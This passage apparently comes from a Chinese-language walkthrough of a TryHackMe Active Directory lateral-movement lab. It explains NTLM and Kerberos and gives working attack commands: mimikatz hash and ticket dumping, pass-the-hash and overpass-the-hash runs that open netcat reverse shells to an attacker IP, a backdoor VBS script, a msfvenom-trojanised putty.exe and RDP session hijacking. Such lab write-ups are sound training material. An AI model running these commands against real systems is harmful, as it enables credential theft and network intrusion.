<span class="line"><span style="color: #61AFEF">C:\Users\t1_corine.waters\Desktop\Flag.exe</span></span></code></pre></div></div></figure>

<h2 id="使用替代身份验证材料"><a href="#使用替代身份验证材料" class="headerlink" title="使用替代身份验证材料"></a>使用替代身份验证材料</h2><p>标题的这个材料指的是在不知道用户密码的情况下，可以用来访问 Windows 账户的任何数据，这是由于 Windows 认证机制导致的，有以下两种认证机制。</p>
<ul>
<li>NTLM authentication</li>
<li>Kerberos authentication</li>
</ul>
<h3 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h3><p>整个过程简单说就是服务器发一个 Challenge ，客户端通过自己的 Hash 值和发过来的 Challenge 产生一个 Response 发给服务器。服务器把收到的 Response 和产生的 Challenge 发给 DC，DC 那边存着用户的 NTML Hash，就再走一遍产生 Response 流程，看看产生的 Response 是不是和服务器发过来的一样，如果一样，就通过，不一样拒绝认证。</p>
<p>不过上述过程是域账户的过程，如果用的本地账户，在服务器本地就能验证这个 Response 了（因为存着账户的凭据）。</p>
<h3 id="Pass-the-Hash-传递-Hash"><a href="#Pass-the-Hash-传递-Hash" class="headerlink" title="Pass-the-Hash 传递 Hash"></a>Pass-the-Hash 传递 Hash</h3><p>通过使用 mimikatz 或类似工具从获得管理权限的主机中提取凭证后，我们可能会得到明文密码或哈希值，这些密码或哈希值很容易被破解。不过，如果我们不够幸运，最终得到的 NTLM 密码哈希值也不会被破解。</p>
<p>虽然看起来我们无法真正使用这些哈希值，但只需知道密码哈希值，就能回应身份验证过程中发送的 NTLM 挑战。这意味着我们无需知道明文密码即可进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们就可以通过哈希值（PtH）成功进行身份验证，而不必破解 NTLM 哈希值。</p>
<p>要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM，或者直接从 LSASS 内存中提取哈希值。</p>
<p>以下命令都是在 mimikatz 工具里面执行的，记得提前传到机器里面。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 从本地 SAM 文件中提取 NTLM hash</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 只能提取本地用户的 NTLM Hash</span></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"><span style="color: #ABB2BF">token::elevate</span></span>
<span class="line"><span style="color: #ABB2BF">lsadump::sam</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 从 LSASS 内存中提取 NTLM hash</span></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"><span style="color: #ABB2BF">token::elevate</span></span>
<span class="line"><span style="color: #ABB2BF">sekurlsa::msv</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 通过 hash 去注入反向 shell</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># PTH 需要在非管理员令牌的上下文中才能成功注入哈希并执行命令</span></span>
<span class="line"><span style="color: #ABB2BF">token::revert</span></span>
<span class="line"><span style="color: #ABB2BF">sekurlsa::pth </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:bob.jenkins </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:</span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ntlm:6b4a57f67805a663c818106dc0648484 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">run:</span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span></span></code></pre></div></div></figure>

<h4 id="Passing-the-Hash-Using-Linux"><a href="#Passing-the-Hash-Using-Linux" class="headerlink" title="Passing the Hash Using Linux"></a>Passing the Hash Using Linux</h4><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Connect to RDP using PtH</span></span>
<span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.200.48.201</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:za.tryhackme.com</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/pth:533f1bd576caa912bdb9da284bbc60fe</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Connect via psexec using PtH</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Note: Only the linux version of psexec support PtH.</span></span>
<span class="line"><span style="color: #61AFEF">psexec.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-hashes</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">NTLM_HASH</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DOMAIN/MyUser@VICTIM_IP</span></span></code></pre></div></div></figure>

<p>Connect to WinRM using PtH:</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre><code>evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</code></pre></div></div></figure>

<h2 id="Kerberos-认证"><a href="#Kerberos-认证" class="headerlink" title="Kerberos 认证"></a>Kerberos 认证</h2><h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><ol>
<li><p>用户<strong>明文发送他的用户名</strong>和用它密码的 Hash 加密过的 timestamp 发送到 <strong>Key Distribution Center (KDC)</strong>。</p>
<p>KDC 会创建一个 <strong>Ticket Granting Ticket (TGT)</strong> 发送回来，他允许用户使用这个 ticket 去向 KDC <strong>请求访问其他服务的 ticket</strong>，而不用传递他们的用户凭证。随着 TGT 发送的还有一个 Session Key，用户需要用它去生成后续的请求。</p>
<p>注意这个 TGT 是用 krbtgt 账户的密码 Hash 加密的，所以用户不能访问里面的内容。但加密的 TGT 里面<strong>带一份 Session Key</strong>，所以 KDC 不需要存储 Session Key ，因为他可以从 TGT 里面恢复出来。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png" alt="Kerberos get TGT" data-caption="Kerberos get TGT" loading="lazy"></p>
</li>
<li><p>当用户想要访问网络上的服务时，例如共享文件夹、网站或数据库，他们会使用TGT 向 KDC 请求 <strong>TGS (Ticket Granting Service)</strong>。TGS 是一种仅允许连接到为其创建的特定服务的 ticket。为了请求 TGS，用户会发送他们的 <strong>Session Key</strong> 加密的 用户名和 timestamp，作为 Authenticator。还有 <strong>TGT</strong> 和 <strong>Service Principal Name (SPN)</strong>。这个 SPN 标识了我们打算访问的服务和服务器名称。</p>
<p>KDC 会向我们发送一个 TGS 和一个用 <strong>Session Key</strong> 加密的 Service Session Key，我们需要用这两个密钥来验证我们要访问的服务。TGS 会用服务所有者的 Hash 进行加密，然后这个 TGS 也跟 TGT 类似，会带一份 Service Session Key，服务所有者可以用他自己的 Hash 来解密。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png" alt="Kerberos get TGS" data-caption="Kerberos get TGS" loading="lazy"></p>
</li>
<li><p>然后可以将TGS发送到所需的服务以进行身份验证和建立连接。该服务将使用其配置的帐户的密码哈希解密TGS并验证服务会话密钥。</p>
<p>解释一下：发送的 Username 和 Timestamp 构成的 <code>Authenticator</code> 是用 Service Session Key 加密的，服务可以用它自己的 Hash 从 TGS 解密出 Service Session Key，然后就可以来解密客户端发来的 <code>Authenticator</code>。</p>
<p>整个过程中，只有在请求 TGT 的时候，用户名没有加密，只加密 timestamp，其他的过程中都是把用户名和 timestamp 一起构成 <code>Authenticator</code> 。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png" alt="Kerberos authenticate" data-caption="Kerberos authenticate" loading="lazy"></p>
</li>
</ol>
<h4 id="认证过程简述"><a href="#认证过程简述" class="headerlink" title="认证过程简述"></a>认证过程简述</h4><p><strong>1. AS (Authentication Service) 认证阶段</strong></p>
<ul>
<li><strong>用户</strong>向 <strong>KDC</strong> 发送一个<strong>明文</strong>请求，其中包含他们的<strong>用户名</strong>和想要访问的<strong>服务主体名称 (SPN)</strong>，这个 SPN 在第一步是固定的，就是 <code>krbtgt</code>。</li>
<li><strong>KDC</strong> 收到请求后，会查找该用户账户的密码哈希。它使用这个哈希来解密请求中的时间戳，如果解密成功，就验证了用户的身份。</li>
<li><strong>KDC</strong> 随后会生成一个<strong>客户端会话密钥 (Client Session Key)</strong>，并用这个密钥来加密时间戳。</li>
<li><strong>KDC</strong> 最后会用 <code>krbtgt</code> 账户的密码哈希加密一个 <strong>TGT</strong> (Ticket Granting Ticket)。这个 TGT 包含了<strong>客户端会话密钥</strong>、用户信息、有效时间等内容。</li>
<li><strong>KDC</strong> 将加密的 TGT 和用用户密码哈希加密过的<strong>客户端会话密钥</strong>发送给用户。</li>
<li><strong>用户</strong>收到后，用自己的密码哈希解密出<strong>客户端会话密钥</strong>，并保存它，但无法解密 TGT。</li>
</ul>
<p><strong>2. TGS (Ticket Granting Service) 认证阶段</strong></p>
<ul>
<li><strong>用户</strong>现在想要访问其他服务。他们使用自己保存的<strong>客户端会话密钥</strong>来生成一个 <strong>Authenticator</strong>，这是一个动态生成的结构，包含用户名和时间戳等信息。</li>
<li><strong>用户</strong>将这个加密的 <strong>Authenticator</strong> 和之前收到的 <strong>TGT</strong> (未解密) 以及想要访问服务的 <strong>SPN</strong> 一起发送给 KDC。</li>
<li><strong>KDC</strong> 收到后，用 <code>krbtgt</code> 账户的密码哈希解密 TGT，从而提取出<strong>客户端会话密钥</strong>。</li>
<li><strong>KDC</strong> 再用这个<strong>客户端会话密钥</strong>去解密 Authenticator。如果成功，就验证了用户是 TGT 的合法持有者。</li>
<li><strong>KDC</strong> 随后会生成一个<strong>服务会话密钥 (Service Session Key)</strong>。</li>
<li><strong>KDC</strong> 创建一个 <strong>TGS</strong> (Ticket Granting Service)，其中包含了<strong>服务会话密钥</strong>、用户信息和时间戳。这个 TGS 会用<strong>服务账户的密码哈希</strong>进行加密。</li>
<li><strong>KDC</strong> 将加密的 TGS 和用<strong>客户端会话密钥</strong>加密过的<strong>服务会话密钥</strong>发送给用户。</li>
<li><strong>用户</strong>收到后，用自己的<strong>客户端会话密钥</strong>解密出<strong>服务会话密钥</strong>，并保存它。</li>
</ul>
<p><strong>3. 服务验证阶段</strong></p>
<ul>
<li><strong>用户</strong>现在拥有了 TGS 和<strong>服务会话密钥</strong>。</li>
<li><strong>用户</strong>会生成另一个用<strong>服务会话密钥</strong>加密的 Authenticator，并与 TGS 一起发送给目标服务。</li>
<li><strong>服务</strong>收到后，使用自己账户的密码哈希解密 TGS，成功后就拿到了<strong>服务会话密钥</strong>。</li>
<li><strong>服务</strong>再用这个<strong>服务会话密钥</strong>去解密用户发送的 Authenticator。</li>
<li>如果所有验证都通过，服务就会确认用户身份合法，并允许访问。</li>
</ul>
<h3 id="Pass-the-Ticket-传递票据"><a href="#Pass-the-Ticket-传递票据" class="headerlink" title="Pass-the-Ticket 传递票据"></a>Pass-the-Ticket 传递票据</h3><p>有些时候我们可以用 mimikatz 从 LSASS 内存中提取 Kerberos ticket 和 session keys，这个过程需要我们拥有 SYSTEM 权限，命令如下</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 下载 mimikatz</span></span>
<span class="line"><span style="color: #E06C75">curl</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> mimikatz.exe http://</span><span style="color: #D19A66">10.50.46.241</span><span style="color: #ABB2BF">/mimikatz.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 提取 Ticket</span></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"><span style="color: #ABB2BF">sekurlsa::</span><span style="color: #E06C75">tickets</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">export</span></span></code></pre></div></div></figure>

<p>如果我们只能访问 ticket，而不能访问 session key，那么这个 ticket 就没用。参考前面的认证过程，发送的 username 和 timestamp 要用 session key 进行加密构成 <strong>Authenticator</strong>。</p>
<p>虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可以用来请求访问允许用户访问的任何服务。同时，TGS 只适用于特定服务。提取 TGT 需要管理员凭证，而提取 TGS 则可以使用低权限账户（仅分配给该账户的权限）。</p>
<p>提取出所需的 ticket 后，我们就可以使用以下命令将 ticket 注入当前会话：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">kerberos::ptt [</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;427fcd5]</span><span style="color: #D19A66">-2-0-40e10000</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75">krbtgt</span><span style="color: #ABB2BF">-ZA.TRYHACKME.COM.kirbi</span></span></code></pre></div></div></figure>

<p>在我们自己的会话中注入票据不需要管理员权限。之后，我们使用的任何横向移动工具都可以使用这些票据。要检查是否正确注入了票据，可以使用 klist 命令。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">za</span><span style="color: #ABB2BF">\bob.jenkins@THMJMP2 C:\&gt;</span><span style="color: #E06C75"> klist</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">Current LogonId is </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">0x1e43562</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">Cached Tickets: (</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">#</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">     Client</span><span style="color: #ABB2BF">: Administrator @ ZA.TRYHACKME.COM</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Server</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">krbtgt</span><span style="color: #ABB2BF">/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM</span></span>
<span class="line"><span style="color: #ABB2BF">        KerbTicket Encryption Type: </span><span style="color: #E06C75">AES</span><span style="color: #D19A66">-256</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">CTS</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">HMAC</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">SHA1</span><span style="color: #D19A66">-96</span></span>
<span class="line"><span style="color: #ABB2BF">        Ticket Flags </span><span style="color: #D19A66">0x40e10000</span><span style="color: #ABB2BF"> -&gt;</span><span style="color: #E06C75"> forwardable</span><span style="color: #ABB2BF"> renewable initial pre_authent name_canonicalize</span></span>
<span class="line"><span style="color: #ABB2BF">        Start </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">End</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">:   </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        Renew </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">23</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Session</span><span style="color: #ABB2BF"> Key Type: </span><span style="color: #E06C75">AES</span><span style="color: #D19A66">-256</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">CTS</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">HMAC</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">SHA1</span><span style="color: #D19A66">-96</span></span>
<span class="line"><span style="color: #ABB2BF">        Cache Flags: </span><span style="color: #D19A66">0x1</span><span style="color: #ABB2BF"> -&gt;</span><span style="color: #E06C75"> PRIMARY</span></span>
<span class="line"><span style="color: #ABB2BF">        Kdc Called: THMDC.za.tryhackme.com</span></span></code></pre></div></div></figure>

<h3 id="Overpass-the-hash-Pass-the-Key"><a href="#Overpass-the-hash-Pass-the-Key" class="headerlink" title="Overpass-the-hash &#x2F; Pass-the-Key"></a>Overpass-the-hash &#x2F; Pass-the-Key</h3><p>这种攻击类型类似于 PtH，但他是作用在 Kerberos 上的。</p>
<p>当用户请求 TGT 时，他们会发送一个时间戳，该时间戳使用从密码中提取的加密密钥加密。根据安装的 Windows 版本和 Kerberos 配置，用于生成该密钥的算法可以是 DES（当前 Windows 版本默认禁用）、RC4、AES128 或 AES256。如果我们拥有这些密钥中的任何一个，就可以向 KDC 申请 TGT，而不需要实际密码，因此被称为 <strong>Pass-the-key (PtK)</strong>。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 提取 Hash</span></span>
<span class="line"><span style="color: #61AFEF">privilege::debug</span></span>
<span class="line"><span style="color: #61AFEF">sekurlsa::ekeys</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 弹一个目标用户权限的 Shell</span></span>
<span class="line"><span style="color: #61AFEF">sekurlsa::pth</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/user:t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/domain:za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/rc4:533f1bd576caa912bdb9da284bbc60fe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 5556&quot;</span></span></code></pre></div></div></figure>

<p>请注意，使用 RC4 时，密钥等于用户的 NTLM 哈希值。这意味着，如果我们能提取 NTLM 哈希值，只要 RC4 是启用的协议之一，我们就能用它来请求 TGT。这种特殊的变种通常被称为  <strong>Overpass-the-Hash (OPtH)</strong>。</p>
<h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>房间的意思应该是我们看能不能提取 <code>t1_toby.beck</code> 的 Hash，然后用这个 Hash 去生成 TGT。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 提取 Hash</span></span>
<span class="line"><span style="color: #61AFEF">privilege::debug</span></span>
<span class="line"><span style="color: #61AFEF">sekurlsa::ekeys</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 用 Hash 生成一个有目标用户权限的 Shell</span></span>
<span class="line"><span style="color: #61AFEF">sekurlsa::pth</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/user:t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/domain:za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/rc4:533f1bd576caa912bdb9da284bbc60fe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 5001&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 拿到目标机器上的 Shell</span></span>
<span class="line"><span style="color: #61AFEF">winrs.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-r:THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 直接执行 Flag.exe</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这里用 -i 能连上，但是可能是两层 Shell 的原因，命令不回显</span></span>
<span class="line"><span style="color: #61AFEF">psexec64.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\\</span><span style="color: #98C379">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">1_toby.beck</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\F</span><span style="color: #98C379">lag.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这种方式不知道为什么执行 Flag 拿不到</span></span>
<span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">psexec.py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">t1_toby.beck@THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-hashes</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">:533f1bd576caa912bdb9da284bbc60fe</span></span></code></pre></div></div></figure>

<h2 id="滥用用户行为"><a href="#滥用用户行为" class="headerlink" title="滥用用户行为"></a>滥用用户行为</h2><p>在某些情况下，攻击者可以利用用户执行的操作进一步访问网络中的机器。</p>
<h3 id="滥用可写共享"><a href="#滥用可写共享" class="headerlink" title="滥用可写共享"></a>滥用可写共享</h3><p>托管在网络共享上的脚本或可执行文件的快捷方式，当用户执行这个快捷方式，可执行文件将从服务器复制到 <code>%temp%</code> 文件夹，并在工作站上执行。</p>
<h4 id="后门-VBS-脚本"><a href="#后门-VBS-脚本" class="headerlink" title="后门 VBS 脚本"></a>后门 VBS 脚本</h4><figure class="shiki vbscript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre><code>CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True</code></pre></div></div></figure>

<h4 id="后门-EXE-程序"><a href="#后门-EXE-程序" class="headerlink" title="后门 EXE 程序"></a>后门 EXE 程序</h4><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x64</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">putty.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-k</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=</span><span style="color: #ABB2BF">&lt;</span><span style="color: #98C379">attacker_i</span><span style="color: #ABB2BF">p&gt; </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">puttyX.exe</span></span></code></pre></div></div></figure>

<h4 id="RDP-劫持"><a href="#RDP-劫持" class="headerlink" title="RDP 劫持"></a>RDP 劫持</h4><p>当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将在服务器上无限期地保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，就可以接管任何现有的 RDP 会话，而无需密码。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 用 SYSTEM 账户的权限来启动一个 cmd.exe</span></span>
<span class="line"><span style="color: #ABB2BF">c:/</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">/PsExec64.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> cmd.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查询活动会话</span></span>
<span class="line"><span style="color: #ABB2BF">query user</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 连接会话 /</span><span style="color: #E06C75">dest</span><span style="color: #ABB2BF">: 是我们目前的会话 前面的数字 </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> 是我们要连接的会话</span></span>
<span class="line"><span style="color: #ABB2BF">tscon </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">dest</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">rdp</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">tcp</span><span style="color: #ABB2BF">#</span><span style="color: #D19A66">6</span></span></code></pre></div></div></figure>

<p>Windows Server 2019 及以上的系统就不允许连接到其他的用户会话了</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>我们介绍的大多数横向移动技术都需要特定端口供攻击者使用。在现实世界的网络中，管理员可能出于安全原因屏蔽了其中一些端口，或者在网络周围实施了隔离，从而阻止你访问 SMB、RDP、WinRM 或 RPC 端口。</p>
<p>要绕过这些限制，我们可以使用端口转发技术，即把任何被入侵的主机作为跳转箱，转到其他主机。由于企业中的每个角色对日常工作所需的网络服务都有不同的需求，因此预计某些机器会比其他机器拥有更多的网络权限。</p>
<h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h3><p>在被攻击机上往往没有 SSH 服务端，我们需要反向连回来打通隧道</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个专门给隧道用的用户</span></span>
